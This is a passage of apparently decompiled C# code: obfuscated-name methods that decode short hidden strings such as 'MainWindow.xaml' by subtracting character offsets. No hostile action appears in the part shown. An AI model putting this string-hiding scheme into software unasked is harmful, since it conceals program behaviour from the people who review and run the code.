        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ﶵﶡﶦﶣﶦﶾﶠ\uFDCFﶟ\uFDD3\uFDCFﶾﶥﶲﶢ()
  {
    string source = "鎀鎅鎒";
    string str = "37660";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string ဏ\u0FF5တ\u0FE5\u0FDD\u0FDD\u0FF6တ\u0FE3\u0FE5\u0FF4\u0FF0\u0FE1\u0FE5\u0FDE()
  {
    string source = "홽홰홾";
    string str = "54795";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 垬垽垱埜垪垮垫埌垯埑域垲埑埨垮()
  {
    string source = "鶿鶽鶾鷀";
    string str = "40268";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uE1B7\uE1EA\uE1E9\uE1E5\uE1B4\uE1E8\uE1E7\uE1B6\uE1B9\uE1B8\uE1B8\uE1E6\uE1CA\uE1B9\uE1B4()
  {
    string source = "\uE9BE\uE9BD\uE9C5";
    string str = "59726";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 薴薉薴薃薈薇薲薆薊薈薆薳薷薴薉()
  {
    string source = "\uE5C3\uE5C6\uE5BE";
    string str = "58711";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \u25AA\u25D1\u258E\u25BD\u25BB\u25C1\u25BB\u258B\u25BB\u259D\u25A1\u258E\u2592\u25BD\u258F()
  {
    string source = "";
    string str = "19905";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string \uF0D7\uF107\uF10C\uF114\uF0F7\uF0DB\uF0D8\uF116\uF120\uF0F0\uF0D8\uF0D6\uF10B\uF11C\uF0EE()
  {
    string source = "ᖞ";
    string str = "5502";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 侴俢侲俤侴侰侶侶侱俣俢俑俥俺俥()
  {
    string source = "鋳";
    string str = "37514";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 貑賁貗賄貺貔賍貕貕賘貒賆賆貗貺()
  {
    string source = "ѷ";
    string str = "1037";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }

  public static string 亾了乿亀亱亃亿亃亄乾亇仇亲亁亟()
  {
    string source = "뭩뭽뮅뮊뭳뮅뮊뮀뮋뮓뭊뮔뭽뮉뮈";
    string str = "47900";
    StringBuilder stringBuilder = new StringBuilder();
    try
    {
      foreach (char ch in source.ToList<char>())
      {
        int utf32 = checked (Convert.ToInt32(ch) - Convert.ToInt32(str));
        stringBuilder.Append(char.ConvertFromUtf32(utf32));
      }
    }
    finally
    {
      List<char>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return stringBuilder.ToString();
  }
}
